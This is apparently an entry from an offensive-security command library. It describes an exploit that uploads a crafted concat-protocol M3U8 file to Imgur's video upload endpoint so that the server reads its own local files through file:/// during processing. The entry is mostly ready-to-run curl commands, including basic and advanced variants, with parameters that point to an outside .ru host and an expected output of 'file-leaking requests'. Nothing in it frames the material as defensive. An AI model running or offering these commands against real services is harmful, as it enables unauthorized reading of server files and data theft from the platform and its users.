---
data: >-
  curl -X POST https://imgur.com/vidgif/upload -F "file=@concat-crafted.m3u8" -d
  "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12"
tags:
  - local-file-read
  - upload
type: command
output: HTTP/1.1 200 OK with upload confirmation
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.201Z'
id: fa3120c9-19a8-445f-ad27-6a51b9181123
verified: false
validated: true
submitted: true
---
# upload-m3u8-for-file-read

## Command

```bash
curl -X POST https://imgur.com/vidgif/upload -F "file=@concat-crafted.m3u8" -d "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12"
```

## Description

Uploads M3U8 with concat protocol to trigger local file read via file:/// during processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-F "file=@concat-crafted.m3u8"` | Path to concat M3U8 | Yes |
| `source` | Video URL | Yes |
| `url` | Redundant URL | Yes |
| `start/stop` | Time parameters | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://imgur.com/vidgif/upload -F file=@file.m3u8 -d "source=..."
```

### Advanced Usage

```bash
curl -X POST https://imgur.com/vidgif/upload -F "file=@concat.m3u8" -d "source=http://yngwie.ru/1.mp4&start=0.08&stop=5.12" --verbose
```

## Expected Output

200 OK, with processing leading to file-leaking requests.

## Related

- [[Related Procedure: Exploit-Local-File-Read-with-Concat-Protocol]]
